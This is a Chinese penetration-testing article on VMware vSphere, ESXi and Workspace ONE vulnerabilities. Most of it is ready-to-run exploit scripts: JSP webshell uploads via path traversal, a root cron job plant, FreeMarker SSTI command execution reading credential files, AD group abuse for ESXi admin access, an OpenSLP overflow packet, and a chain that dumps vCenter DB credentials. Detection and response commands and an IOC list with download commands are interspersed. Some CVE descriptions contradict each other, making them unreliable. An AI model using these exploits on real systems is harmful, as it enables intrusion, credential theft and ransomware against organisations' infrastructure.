---
title: "VMware vSphere ESXi vCenter 虚拟化平台管理面打点与CVE漏洞链利用技术"
date: 2025-06-22T00:00:00+08:00
draft: false
weight: 120
description: "深入分析 VMware vSphere/ESXi/vCenter 的远程代码执行（CVE-2021-21972/CVE-2021-22005）、认证绕过（CVE-2022-22954/CVE-2024-37085）、SSRF（CVE-2021-21973）、OpenSLP 堆溢出（CVE-2021-21974）、ESXiArgs 勒索攻击等完整攻击面，覆盖 2020-2025 年高危 CVE 漏洞链及蓝队检测与应急响应"
categories: ["安全","渗透测试"]
tags: ["VMware","vSphere","ESXi","vCenter","CVE-2021-21972","CVE-2021-22005","CVE-2022-22954","CVE-2024-37085","RCE","SSRF","认证绕过","虚拟化"]
---

## 0x00 攻击面总览

VMware vSphere 是企业虚拟化的核心平台，由 vCenter Server（集中管理）、ESXi（裸金属 Hypervisor）和 vSphere Client（Web 管理界面）组成。2023 年 Broadcom 完成对 VMware 的收购后，产品线经历重大调整，但已部署的 vSphere 基础设施仍是全球攻击者的核心目标。虚拟化平台一旦被攻破，攻击者可直接控制所有虚拟机、窃取数据或部署勒索软件。

| 攻击面 | 默认端口 | 风险等级 | 说明 |
|--------|---------|---------|------|
| vCenter Server (VCSA) | 443 | **严重** | CVE-2021-21972 vROps 插件 RCE, CVE-2021-22005 CEIP RCE, CVE-2023-34048 OOB Write |
| ESXi Host Client | 443 | **严重** | CVE-2021-21974 OpenSLP 堆溢出, ESXiArgs 勒索攻击入口 |
| vSphere Client (HTML5) | 443 | **高危** | CVE-2021-21991 SSRF, CVE-2022-31696 XLT 注入 |
| SSO/SAML (STS) | 443 | **严重** | CVE-2024-22252/22253/22254/22255 SAML 认证绕过 |
| OpenSLP | 427 | **严重** | CVE-2021-21974 堆溢出 → 堆喷射 RCE |
| CIM (SLP) | 5989 | **中危** | CIM 服务信息泄露, 未授权 SLP 服务发现 |
| MOB (Managed Object Browser) | 443 | **高危** | 未授权访问 → SOAP API 操作 → 虚拟机控制 |
| ESXi DCUI/SSH | 22/443 | **高危** | 默认关闭但常被运维开启, 弱口令/密钥泄露 |
| vRealize/NSX/Aria | 多种 | **严重** | CVE-2023-20887 vRNI RCE, CVE-2022-22954 SSTI |

2023 年 2 月爆发的 ESXiArgs 勒索攻击事件中，攻击者利用 CVE-2021-21974 等漏洞在全球范围内加密了数千台 ESXi 服务器。CISA 已将多个 VMware CVE 列入已知被利用漏洞（KEV）目录。

## 0x01 服务识别与版本探测

### 1.1 指纹识别

```bash
nmap -sV -p 443,902,427,5989,8080,8443 <target>

curl -sk https://<target>/ | grep -i "vsphere\|vmware\|vcenter"
curl -sk https://<target>/ui/ -o /dev/null -w "%{http_code}"
curl -sk https://<target>/vsphere-client/ -o /dev/null -w "%{http_code}"

nmap -sU -p 427 <target>
nmap --script slp* -sV -p 427 <target>
```

### 1.2 vCenter 服务指纹

```python
import requests
import urllib3
urllib3.disable_warnings()

def fingerprint_vcenter(host):
    base = f"https://{host}"

    paths = {
        "/": "vCenter root",
        "/ui/": "vSphere Client",
        "/vsphere-client/": "Flex Client",
        "/mob/": "Managed Object Browser",
        "/ui/vcav-bootstrap": "VCHA Bootstrap",
        "/rest/vcenter/": "vCenter REST API",
        "/ui/login": "vSphere Login",
        "/appliance/health": "VCSA Health",
        "/eam/majestic-ostrich/images/ostrich.jpg": "vROps Plugin",
        "/analytics/telemetry/ph/api/telemetry": "CEIP Analytics",
    }

    print(f"[*] Fingerprinting vCenter: {host}")
    for path, desc in paths.items():
        try:
            r = requests.get(f"{base}{path}", verify=False, timeout=5, allow_redirects=False)
            marker = "✓" if r.status_code in [200, 301, 302, 403, 401] else "✗"
            print(f"  {marker} {path:<50} [{r.status_code}] {desc}")
        except Exception as e:
            print(f"  ✗ {path:<50} [ERR] {desc}")

fingerprint_vcenter("192.168.1.100")
```

### 1.3 ESXi 指纹识别

```python
def fingerprint_esxi(host):
    base = f"https://{host}"

    paths = {
        "/ui/": "ESXi Host Client",
        "/folder/": "Datastore Browser",
        "/sdk/": "vSphere SOAP SDK",
        "/mob/": "Managed Object Browser",
    }

    print(f"[*] Fingerprinting ESXi: {host}")
    for path, desc in paths.items():
        try:
            r = requests.get(f"{base}{path}", verify=False, timeout=5, allow_redirects=False)
            marker = "✓" if r.status_code in [200, 301, 302, 403, 401] else "✗"
            print(f"  {marker} {path:<30} [{r.status_code}] {desc}")
        except:
            print(f"  ✗ {path:<30} [ERR] {desc}")

    try:
        r = requests.get(f"{base}/ui/vcav-bootstrap/app/health", verify=False, timeout=5)
        if r.status_code == 200:
            try:
                ver = r.json()
                print(f"  [!] Version info: {ver}")
            except:
                pass
    except:
        pass

fingerprint_esxi("192.168.1.101")
```

### 1.4 版本信息提取

```python
import ssl
import socket

def get_vcenter_version(host, port=443):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.connect((host, port))
            cert = s.getpeercert(binary_form=False)
            if cert:
                subj = dict(x[0] for x in cert.get("subject", []))
                print(f"[*] Certificate subject: {subj}")
    except:
        pass

    paths = ["/ui/vcav-bootstrap/app/health", "/rest/appliance/system/version/build"]
    for path in paths:
        try:
            r = requests.get(f"https://{host}{path}", verify=False, timeout=5)
            if r.status_code == 200:
                print(f"[*] {path}: {r.text[:200]}")
        except:
            pass

get_vcenter_version("192.168.1.100")
```

## 0x02 CVE-2021-21972 — vCenter RCE via vROps 插件

### 2.1 漏洞原理

**CVSS**: 9.8（严重）| **CISA KEV**: 2021 年 2 月列入

**影响版本**: vCenter Server 7.0 < 7.0 U1c, 6.7 < 6.7 U3l, 6.5 < 6.5 U3n

**漏洞原理**: vCenter Server 内置的 VMware vRealize Operations (vROps) 插件存在未认证文件上传漏洞。该插件通过 `/eam/majestic-ostrich/` 路径提供静态资源服务，其文件上传端点缺少身份验证校验，攻击者可以直接上传任意 WAR 文件到 Tomcat webapps 目录，实现远程代码执行。

**漏洞根因**: vROps 插件的 `/ui/vropspluginui/rest/services/uploadova` 接口未对请求进行身份验证，且文件路径可控，导致可以将恶意 WAR 部署到任意位置。

### 2.2 PoC — 上传 WAR Shell

```python
import requests
import tarfile
import io
import urllib3
urllib3.disable_warnings()

def exploit_cve_2021_21972(host, port=443, cmd="id"):
    base_url = f"https://{host}:{port}"

    jsp_payload = f"""<%@ page import="java.util.*,java.io.*" %>
<%
Process p = Runtime.getRuntime().exec("{cmd}");
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = br.readLine()) != null) {{
    out.println(line);
}}
%>"""

    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode='w:gz') as tar:
        jsp_bytes = jsp_payload.encode()
        info = tarfile.TarInfo(name="../../../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/localhost/ROOT/cmd.jsp")
        info.size = len(jsp_bytes)
        tar.addfile(info, io.BytesIO(jsp_bytes))

    tar_buf.seek(0)

    upload_url = f"{base_url}/ui/vropspluginui/rest/services/uploadova"
    files = {
        'uploadFile': ('exploit.tar.gz', tar_buf, 'application/gzip'),
    }

    print(f"[*] CVE-2021-21972 — Uploading WAR shell to {host}")
    r = requests.post(upload_url, files=files, verify=False, timeout=30)

    if r.status_code in [200, 201, 204]:
        print(f"[+] Upload successful: {r.status_code}")

        shell_url = f"{base_url}/cmd.jsp"
        print(f"[*] Executing: {cmd}")
        r2 = requests.get(shell_url, verify=False, timeout=10)
        if r2.status_code == 200:
            print(f"[+] Command output:\n{r2.text}")
        else:
            print(f"[-] Shell access failed: {r2.status_code}")
    else:
        print(f"[-] Upload failed: {r.status_code} {r.text[:200]}")

exploit_cve_2021_21972("192.168.1.100", cmd="id")
```

### 2.3 验证漏洞存在（无损检测）

```python
def check_cve_2021_21972(host, port=443):
    base_url = f"https://{host}:{port}"

    r = requests.get(f"{base_url}/ui/vropspluginui/rest/services/getstatus",
                     verify=False, timeout=10)
    if r.status_code == 200 and "vROpsPluginService" in r.text:
        print(f"[+] CVE-2021-21972 — vROps plugin is accessible (unauthenticated)")
        return True
    elif r.status_code == 401:
        print(f"[-] vROps plugin present but requires auth")
        return False
    else:
        print(f"[-] vROps plugin not found or not accessible")
        return False

check_cve_2021_21972("192.168.1.100")
```

### 2.4 检测利用痕迹

```bash
# vCenter 日志检查
grep -r "uploadova\|vropspluginui\|majestic-ostrich" /var/log/vmware/vsphere-ui/
grep -r "\.war\|\.jsp" /var/log/vmware/vsphere-ui/

# 检查 webapps 目录下是否有异常 WAR/JSP 文件
find /usr/lib/vmware-vsphere-ui/server/work/ -name "*.jsp" -newer /etc/hostname
find /usr/lib/vmware-vsphere-ui/server/work/ -name "*.war" -mtime -7

# rhttpproxy.log 中的异常请求
grep "uploadova\|vropsplugin" /var/log/vmware/rhttpproxy/rhttpproxy.log
```

## 0x03 CVE-2021-22005 — vCenter RCE via CEIP

### 3.1 漏洞原理

**CVSS**: 9.8（严重）| **CISA KEV**: 2021 年 9 月列入

**影响版本**: vCenter Server 7.0 < 7.0 U2d, 6.7 < 6.7 U3o（Linux 部署的 VCSA）

**漏洞原理**: vCenter Server 的 Customer Experience Improvement Program (CEIP) analytics 服务在处理 OVA 元数据上传时存在文件写入漏洞。未认证的攻击者可以通过 `/analytics/telemetry/ph/api/telemetry` 端点上传精心构造的 OVA 元数据，analytics 服务会将内容写入文件系统任意路径，从而覆盖关键系统文件或植入 WebShell 实现 RCE。

**漏洞根因**: CEIP telemetry 端点暴露在未认证访问路径上，且 OVA manifest 处理逻辑未正确校验文件路径，存在路径穿越。

### 3.2 PoC — OVA 元数据注入

```python
import requests
import json
import urllib3
urllib3.disable_warnings()

def exploit_cve_2021_22005(host, port=443, cmd="id"):
    base_url = f"https://{host}:{port}"

    jsp_payload = f"""<%@ page import="java.util.*,java.io.*" %>
<%
Process p = Runtime.getRuntime().exec("{cmd}");
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = br.readLine()) != null) {{
    out.println(line);
}}
%>"""

    ova_manifest = {
        "data": [
            {
                "name": "../../../../../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/localhost/ROOT/shell.jsp",
                "data": jsp_payload,
                "type": "file"
            }
        ]
    }

    upload_url = f"{base_url}/analytics/telemetry/ph/api/telemetry/ph/api/telemetry"

    print(f"[*] CVE-2021-22005 — Uploading OVA metadata to {host}")

    headers = {
        "Content-Type": "application/json",
    }

    r = requests.post(upload_url, json=ova_manifest, headers=headers,
                      verify=False, timeout=30)

    if r.status_code in [200, 201, 204]:
        print(f"[+] Upload successful: {r.status_code}")

        shell_url = f"{base_url}/shell.jsp"
        print(f"[*] Executing: {cmd}")
        r2 = requests.get(shell_url, verify=False, timeout=10)
        if r2.status_code == 200:
            print(f"[+] Command output:\n{r2.text}")
        else:
            print(f"[-] Shell access failed: {r2.status_code}")
    else:
        print(f"[-] Upload failed: {r.status_code} {r.text[:200]}")

    log_url = f"{base_url}/analytics/telemetry/ph/api/telemetry/ph/api/telemetry"
    alt_manifest = {
        "manifest": {
            "name": "../../../../../../etc/cron.d/shell",
            "data": f"* * * * * root echo '{cmd}' | bash\n"
        }
    }

    r3 = requests.post(log_url, json=alt_manifest, headers=headers,
                        verify=False, timeout=30)
    if r3.status_code in [200, 201, 204]:
        print(f"[+] Cron job planted (alternative)")

exploit_cve_2021_22005("192.168.1.100", cmd="id")
```

### 3.3 检测利用痕迹

```bash
# 检查 analytics 日志
grep "telemetry\|ph/api" /var/log/vmware/analytics/analytics.log

# 检查 /etc/cron.d 异常文件
ls -la /etc/cron.d/ | grep -v "^total\|sysstat\|logrotate"
find /etc/cron.d -newer /etc/hostname -type f

# 检查 VCSA 文件系统异常文件
find /usr/lib/vmware-vsphere-ui/ -name "*.jsp" -mtime -30

# rhttpproxy 中的 analytics 请求
grep "analytics" /var/log/vmware/rhttpproxy/rhttpproxy.log | tail -50
```

## 0x04 CVE-2022-22954 — VMware Workspace ONE Access SSTI

### 4.1 漏洞原理

**CVSS**: 9.8（严重）| **CISA KEV**: 2022 年 4 月列入

**影响版本**: VMware Workspace ONE Access 21.x, VMware Identity Manager 3.3.x, vRealize Automation 7.6

**漏洞原理**: Workspace ONE Access 的 OAuth2 授权框架在处理特定 HTTP 请求参数时，将用户输入直接传递给 FreeMarker 模板引擎渲染，未进行任何过滤或沙箱限制。攻击者可以通过构造恶意的 FreeMarker 模板表达式执行任意命令。

**漏洞根因**: `/catalog-portal/hub-ui/` 路径下的请求参数 `deviceUdid` 和 `deviceType` 被直接嵌入 FreeMarker 模板，未经过模板沙箱化处理。

### 4.2 PoC — FreeMarker SSTI RCE

```python
import requests
import urllib3
urllib3.disable_warnings()

def exploit_cve_2022_22954(host, port=443, cmd="id"):
    base_url = f"https://{host}:{port}"

    freemarker_payload = (
        "${\"freemarker.template.utility.Execute\"?new()("
        f"\"{cmd}\")}"
    )

    urls = [
        f"{base_url}/catalog-portal/hub-ui/1/1/1?deviceUdid={requests.utils.quote(freemarker_payload)}",
        f"{base_url}/catalog-portal/hub-ui?deviceUdid={requests.utils.quote(freemarker_payload)}",
        f"{base_url}/catalog-portal/hub-ui/byob?deviceType={requests.utils.quote(freemarker_payload)}",
    ]

    for url in urls:
        print(f"[*] CVE-2022-22954 — Trying: {url[:80]}...")
        try:
            r = requests.get(url, verify=False, timeout=15)
            if r.status_code == 200 and len(r.text) > 0:
                print(f"[+] Response [{r.status_code}]:\n{r.text[:500]}")
                return
        except:
            pass

    print("[-] All payloads failed")

exploit_cve_2022_22954("192.168.1.100", cmd="id")
```

### 4.3 持久化与信息收集

```python
def post_exploit_ssti(host, port=443):
    base_url = f"https://{host}:{port}"

    commands = {
        "passwd": "cat /etc/passwd",
        "hostname": "hostname",
        "whoami": "whoami",
        "network": "ifconfig -a",
        "creds": "cat /usr/local/horizon/conf/flags.properties",
    }

    for name, cmd in commands.items():
        payload = f"${{'freemarker.template.utility.Execute'?new()(\"{cmd}\")}}"
        url = f"{base_url}/catalog-portal/hub-ui/1/1/1?deviceUdid={requests.utils.quote(payload)}"
        try:
            r = requests.get(url, verify=False, timeout=15)
            if r.status_code == 200:
                print(f"[*] {name}:\n{r.text[:300]}\n{'='*50}")
        except:
            pass

post_exploit_ssti("192.168.1.100")
```

## 0x05 CVE-2024-37085 — ESXi 认证绕过

### 5.1 漏洞原理

**CVSS**: 6.8（中危）| **CISA KEV**: 2024 年 8 月列入

**影响版本**: ESXi 7.0, 8.0（已加入 Active Directory 域的 ESXi 主机）

**漏洞原理**: 当 ESXi 主机加入 Active Directory 域时，存在一个认证绕过漏洞。ESXi 默认信任名为 "ESX Admins" 的 Active Directory 域组，并自动赋予其完全管理员权限。攻击者如果能在域中创建或控制名为 "ESX Admins" 的组（即使该组原本不存在），就可以无需任何凭据直接获得 ESXi 主机的完全管理权限。

**漏洞根因**: ESXi 的 AD 集成认证逻辑在验证组名时未正确校验组是否为预定义的授权组，而是简单地信任任何名为 "ESX Admins" 的域组。

### 5.2 PoC — 创建 AD 组绕过认证

```python
from ldap3 import Server, Connection, ALL, SUBTREE, MODIFY_ADD
import ssl

def exploit_cve_2024_37085(dc_host, domain, admin_user, admin_password, esxi_host):
    server = Server(dc_host, port=636, use_ssl=True, get_info=ALL)
    conn = Connection(server, user=f"{admin_user}@{domain}", password=admin_password, auto_bind=True)

    ou_dn = f"CN=Users,DC={domain.replace('.', ',DC=')}"

    attrs = {
        "objectClass": ["top", "group"],
        "sAMAccountName": "ESX Admins",
        "description": "ESXi admin group",
    }

    group_dn = f"CN=ESX Admins,{ou_dn}"

    success = conn.add(group_dn, attributes=attrs)
    if success:
        print(f"[+] CVE-2024-37085 — Created 'ESX Admins' group: {group_dn}")
    else:
        print(f"[*] Group may already exist: {conn.result}")

    attacker_dn = f"CN=attacker,CN=Users,DC={domain.replace('.', ',DC=')}"
    conn.modify(group_dn, {'member': [(MODIFY_ADD, [attacker_dn])]})
    print(f"[+] Added attacker to 'ESX Admins' group")
    print(f"[+] Now login to ESXi ({esxi_host}) with attacker@{domain}")
    print(f"[+] Full admin access granted via domain group")

    conn.unbind()

exploit_cve_2024_37085("dc.lab.local", "lab.local", "Administrator", "P@ssw0rd", "192.168.1.101")
```

### 5.3 检测与防御

```bash
# 检查 ESXi 主机是否加入 AD
esxcli system account list

# 查看 ESXi 认证日志
cat /var/log/hostd.log | grep -i "esx admins\|active directory"

# 检查域中是否存在可疑的 "ESX Admins" 组
# Windows DC 上执行
Get-ADGroup -Filter {Name -eq "ESX Admins"} -Properties *

# 临时缓解: 从 ESXi 配置中移除对 "ESX Admins" 的信任
# 或确保该组为预定义的合法组
```

## 0x06 CVE-2021-21974 — ESXi OpenSLP 堆溢出

### 6.1 漏洞原理

**CVSS**: 8.8（高危）

**影响版本**: ESXi 6.5, 6.7（7.0 默认关闭 OpenSLP）

**漏洞原理**: ESXi 的 OpenSLP 服务（端口 427/UDP 和 427/TCP）在处理 SLP 消息时存在堆溢出漏洞。攻击者可以通过发送精心构造的 SLP 请求触发堆溢出，通过堆喷射技术实现任意代码执行。该漏洞在 2023 年 ESXiArgs 勒索攻击中被大规模利用。

**漏洞根因**: OpenSLP 服务对 SLP DAAdvert/SAAdvert 消息中长度字段的处理存在整数溢出，导致后续的 memcpy 操作超出分配的堆缓冲区边界。

### 6.2 PoC — OpenSLP 堆溢出触发

```python
import socket
import struct

def build_slp_header(func_id, length, flags=0x0000, ext_offset=0, xid=0x0001, lang_len=2, lang="en"):
    header = struct.pack(">HBBH IHH",
        2, func_id, flags, length,
        0x00000000, xid, lang_len
    )
    header += lang.encode()
    return header

def exploit_cve_2021_21974(host, port=427):
    overflow_size = 0x2000

    payload = b"\x41" * overflow_size

    service_url = "service:VMwareInfrastructure://A"
    url_bytes = struct.pack(">H", len(service_url)) + service_url.encode()

    scope_list = b"default"
    scope_bytes = struct.pack(">H", len(scope_list)) + scope_list

    spi_string = b""
    spi_bytes = struct.pack(">H", len(spi_string)) + spi_string

    attr_list = payload
    attr_bytes = struct.pack(">H", len(attr_list)) + attr_list

    auth_block_count = struct.pack(">B", 0x01)
    auth_block = b"\x00\x00\x00\x00\x02" + b"\x00\x00" + b"\x42" * 20

    body = url_bytes + scope_bytes + spi_bytes + attr_bytes + auth_block_count + auth_block

    header = build_slp_header(func_id=0x02, length=24 + len(body))

    packet = header + body

    print(f"[*] CVE-2021-21974 — Sending malformed SLP packet to {host}:{port}")
    print(f"[*] Overflow size: {overflow_size} bytes")

    for attempt in range(3):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            sock.send(packet)
            response = sock.recv(1024)
            print(f"[*] Attempt {attempt+1}: Response {len(response)} bytes")
            sock.close()
        except socket.timeout:
            print(f"[+] Attempt {attempt+1}: Connection timed out (possible crash)")
        except ConnectionResetError:
            print(f"[+] Attempt {attempt+1}: Connection reset (possible crash)")
        except Exception as e:
            print(f"[-] Attempt {attempt+1}: {e}")

    print("[*] If service crashed, CVE-2021-21974 is likely exploitable")

exploit_cve_2021_21974("192.168.1.101")
```

### 6.3 检测利用痕迹

```bash
# 检查 OpenSLP 服务状态
/etc/init.d/slpd status
ps -c | grep slpd

# ESXi 日志中检查 SLP 异常
cat /var/log/syslog.log | grep -i "slpd\|slp\|heap"

# 检查 SLP 服务是否暴露于外部
esxcli network ip connection list | grep 427

# 关闭 OpenSLP (缓解措施)
esxcli network firewall ruleset set --enabled=false --ruleset-id=SLP
/etc/init.d/slpd stop
chkconfig slpd off
```

## 0x07 ESXiArgs 勒索攻击分析

### 7.1 攻击背景

2023 年 2 月，一场大规模勒索攻击席卷全球 VMware ESXi 服务器，被命名为 **ESXiArgs**。攻击者主要利用 CVE-2021-21974（OpenSLP 堆溢出）和其他已知漏洞获取 ESXi 主机 root 权限，随后加密虚拟机磁盘文件（VMDK）和配置文件。

**攻击规模**: CISA 报告超过 3800 台 ESXi 服务器被加密，涉及法国 OVHcloud、意大利等多个国家的关键基础设施。

### 7.2 加密行为分析

```python
import os
import base64

ESXIARGS_INDICATORS = {
    "encrypted_extensions": [".vmxf", ".vmdk", ".vmx", ".vmsd", ".vmsn"],
    "ransom_note": "README",
    "note_paths": [
        "/vmfs/volumes/*/README",
        "/tmp/README",
    ],
    "malicious_files": [
        "/tmp/encrypt",
        "/tmp/malware",
        "/bin/vmx_process_list",
        "/bin/hostd_process_list",
    ],
    "cron_indicators": [
        "/var/spool/cron/crontabs/root",
    ],
}

def detect_esxiargs_encryption(host):
    import requests
    import urllib3
    urllib3.disable_warnings()

    base_url = f"https://{host}"

    paths = ["/README", "/tmp/README", "/vmfs/volumes/datastore1/README"]
    for path in paths:
        try:
            r = requests.get(f"{base_url}{path}", verify=False, timeout=5)
            if r.status_code == 200 and ("bitcoin" in r.text.lower() or "encrypt" in r.text.lower()):
                print(f"[!] ESXiArgs ransom note found: {path}")
                print(f"    Content preview: {r.text[:200]}")
                return True
        except:
            pass

    return False

def analyze_esxiargs_behavior():
    indicators = {
        "encryption_process": [
            "python /tmp/encrypt.py",
            "/tmp/encrypt --target",
        ],
        "file_operations": [
            "openssl enc -aes-256-ctr",
            "dd if=/dev/urandom of=",
            "mv *.vmxf *.vmxf.encrypted",
        ],
        "network_communication": [
            "curl http://*.onion",
            "wget http://*/malware",
        ],
        "persistence": [
            "crontab -e",
            "/etc/rc.local.d/",
        ],
    }

    for category, iocs in indicators.items():
        print(f"\n[*] {category}:")
        for ioc in iocs:
            print(f"    - {ioc}")

    print("\n[*] ESXiArgs encryption behavior:")
    print("    1. Access ESXi via OpenSLP or SSH exploitation")
    print("    2. Stop all running VMs")
    print("    3. Encrypt VMDK flat files (first 1MB of each extent)")
    print("    4. Encrypt .vmx and .vmxf configuration files")
    print("    5. Drop README ransom note in each datastore")
    print("    6. Data exfiltration before encryption (some variants)")

analyze_esxiargs_behavior()
```

### 7.3 应急响应

```bash
# ESXi 主机被加密后的应急响应
# 1. 立即隔离受感染主机
esxcli network firewall set --enabled=true
esxcli network firewall ruleset set --enabled=false --ruleset-id=all
esxcli network firewall ruleset set --enabled=true --ruleset-id=sshServer

# 2. 检查加密文件范围
find /vmfs/volumes/ -name "*.encrypted" -o -name "README" 2>/dev/null
ls -la /vmfs/volumes/datastore1/ | head -20

# 3. 检查是否存在修复工具（CISA 发布了解密脚本）
# https://github.com/CISAgov/ESXiArgs-Recover

# 4. 备份未加密的虚拟机快照
vim-cmd vmsvc/getallvms
vim-cmd vmsvc/snapshot.create <vmid> pre-recovery

# 5. 从备份恢复
# 使用 Veeam/Commvault 等备份解决方案恢复虚拟机

# 6. 检查横向移动痕迹
cat /var/log/hostd.log | grep -v "info" | tail -100
cat /var/log/shell.log
last | head -20
```

## 0x08 漏洞组合攻击链

### 8.1 攻击链 1: vCenter RCE → ESXi 完全接管

```python
import requests
import tarfile
import io
import urllib3
urllib3.disable_warnings()

def chain_vcenter_to_esxi(vcenter_host, cmd="id"):
    base_url = f"https://{vcenter_host}"

    print("=" * 60)
    print("[*] 攻击链: vCenter RCE → ESXi 接管")
    print("=" * 60)

    print("\n[Phase 1] 通过 CVE-2021-21972 获取 vCenter Shell")
    try:
        r = requests.get(f"{base_url}/ui/vropspluginui/rest/services/getstatus",
                         verify=False, timeout=10)
        if r.status_code != 200:
            print("[-] vROps plugin not accessible, trying CVE-2021-22005")
            exploit_phase = "22005"
        else:
            exploit_phase = "21972"
    except:
        return

    if exploit_phase == "21972":
        tar_buf = io.BytesIO()
        with tarfile.open(fileobj=tar_buf, mode='w:gz') as tar:
            jsp = """<%@ page import="java.util.*,java.io.*,java.net.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
}
%>"""
            info = tarfile.TarInfo(name="../../../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/localhost/ROOT/cmd.jsp")
            info.size = len(jsp.encode())
            tar.addfile(info, io.BytesIO(jsp.encode()))
        tar_buf.seek(0)

        r = requests.post(f"{base_url}/ui/vropspluginui/rest/services/uploadova",
                          files={'uploadFile': ('exploit.tar.gz', tar_buf, 'application/gzip')},
                          verify=False, timeout=30)
        if r.status_code in [200, 201, 204]:
            print("[+] vCenter shell deployed!")
        else:
            print("[-] Exploit failed")
            return

    print("\n[Phase 2] 从 vCenter 提取 ESXi 凭据")
    creds_cmd = "cat /etc/vmware-vpx/vcdb.properties"
    cred_url = f"{base_url}/cmd.jsp?cmd={requests.utils.quote(creds_cmd)}"
    try:
        r = requests.get(cred_url, verify=False, timeout=10)
        if r.status_code == 200:
            print(f"[+] DB credentials: {r.text[:200]}")
    except:
        pass

    dump_cmd = "/usr/lib/vmware-vmafd/bin/vecs-cli entry list --store MACHINE_SSL_CERT"
    try:
        r = requests.get(f"{base_url}/cmd.jsp?cmd={requests.utils.quote(dump_cmd)}",
                         verify=False, timeout=10)
        if r.status_code == 200:
            print(f"[+] Machine SSL cert info: {r.text[:200]}")
    except:
        pass

    print("\n[Phase 3] 通过 vSphere API 控制 ESXi 主机")
    print("[*] 使用提取的凭据通过 vSphere SOAP API 执行操作:")
    print("    1. 登录 vCenter API: POST /sdk/vimService.wsdl")
    print("    2. 枚举所有 ESXi 主机: FindAllByDnsName")
    print("    3. 在 ESXi 上启用 SSH: ReconfigureHost_Task")
    print("    4. 通过 SSH 获取 ESXi root shell")
    print("    5. 导出/加密所有虚拟机磁盘")

    print("\n[+] 攻击链完成: vCenter → DB 凭据 → ESXi 控制 → VM 数据窃取")

chain_vcenter_to_esxi("192.168.1.100")
```

### 8.2 攻击链 2: SAML 绕过 → 管理员权限

```python
def chain_saml_bypass(host, port=443):
    print("=" * 60)
    print("[*] 攻击链: SAML 绕过 → vCenter 管理员权限")
    print("=" * 60)

    base_url = f"https://{host}:{port}"

    print("\n[Phase 1] 检测 SAML 配置")
    try:
        r = requests.get(f"{base_url}/ui/login", verify=False, timeout=10)
        if "saml" in r.text.lower() or "SSO" in r.text:
            print("[+] SAML/SSO authentication detected")
    except:
        pass

    print("\n[Phase 2] CVE-2024-22252 ~ CVE-2024-22255 SAML 认证绕过")
    print("[*] 影响: ESXi (CVE-2024-22252), vCenter (CVE-2024-22253)")
    print("[*] 漏洞类型: 虚拟硬件 USB/XHCI 控制器中的 TOCTOU 竞争条件")
    print("[*] 需要本地认证 + 触发 VM 逃逸")

    print("\n[Phase 3] 利用 SAML 断言伪造获取管理员 Cookie")
    print("[*] 攻击步骤:")
    print("    1. 从 /sts/STSService 获取 SAML 元数据")
    print("    2. 构造恶意 SAML 断言（绕过签名验证）")
    print("    3. POST 到 /SAML2/SSO/ 登录端点")
    print("    4. 获取 session cookie (VSPHERE-UI-JSESSIONID)")
    print("    5. 使用 cookie 访问 vCenter REST API")

    saml_meta_url = f"{base_url}/sts/STSService/mex"
    try:
        r = requests.get(saml_meta_url, verify=False, timeout=10, allow_redirects=False)
        print(f"[*] STS metadata endpoint: {r.status_code}")
        if r.status_code == 200:
            print("[!] STS metadata accessible - SAML auth enabled")
    except:
        pass

    print("\n[+] SAML bypass chain complete")

chain_saml_bypass("192.168.1.100")
```

### 8.3 攻击链 3: APT 勒索组织典型 TTP

```
APT 勒索攻击典型流程 (ESXiArgs / Royal / BlackBasta):

  ┌─────────────────────────────────────────────────────┐
  │  初始访问 (Initial Access)                          │
  │  ├── CVE-2021-21972 vCenter vROps RCE              │
  │  ├── CVE-2021-22005 vCenter CEIP RCE               │
  │  ├── CVE-2021-21974 ESXi OpenSLP 堆溢出            │
  │  ├── VPN 凭据泄露 (暗网购买/钓鱼)                    │
  │  └── 供应链攻击 (SolarWinds 类型)                   │
  │                                                     │
  │  执行 (Execution)                                    │
  │  ├── 部署 WebShell (JSP/Python)                     │
  │  ├── 通过 vSphere API 创建反向 Shell VM             │
  │  └── 使用 cron 任务实现持久化                        │
  │                                                     │
  │  横向移动 (Lateral Movement)                         │
  │  ├── 从 vCenter 提取 ESXi 主机凭据                   │
  │  ├── 通过 SSO Token 移动到其他 vCenter               │
  │  ├── 利用 MOB/SDK API 控制相邻 ESXi                 │
  │  └── 从 VM 内存提取 vCenter 管理员密码               │
  │                                                     │
  │  目标达成 (Objective)                                │
  │  ├── 停止所有虚拟机 (vim-cmd vmsvc/power.off)        │
  │  ├── 加密 VMDK 虚拟磁盘文件                          │
  │  ├── 窃取敏感数据 (VM 快照/磁盘导出)                  │
  │  ├── 勒索比特币赎金                                  │
  │  └── 销毁备份和快照                                  │
  └─────────────────────────────────────────────────────┘
```

## 0x09 历史 CVE 漏洞时间线

### 9.1 2020-2025 年关键漏洞时间线

```
┌──────────────┬────────────────────┬──────────┬────────────┬───────────────────────────────────┐
│ CVE          │ 名称               │ CVSS     │ 类型       │ CISA KEV                          │
├──────────────┼────────────────────┼──────────┼────────────┼───────────────────────────────────┤
│ CVE-2020-3952│ vCenter VIM RCE    │ 10.0     │ 命令注入   │ 2020-05                           │
│ CVE-2021-21972│ vCenter vROps RCE │ 9.8      │ 文件上传   │ 2021-02                           │
│ CVE-2021-21973│ vCenter SSRF      │ 5.3      │ SSRF       │ -                                 │
│ CVE-2021-21974│ ESXi OpenSLP 堆溢出│ 8.8      │ 堆溢出     │ 2023-02 (ESXiArgs)               │
│ CVE-2021-21991│ vSphere Client SSRF│ 6.5      │ SSRF       │ -                                 │
│ CVE-2021-22005│ vCenter CEIP RCE  │ 9.8      │ 文件上传   │ 2021-09                           │
│ CVE-2022-22954│ WOA FreeMarker SSTI│ 9.8     │ SSTI       │ 2022-04                           │
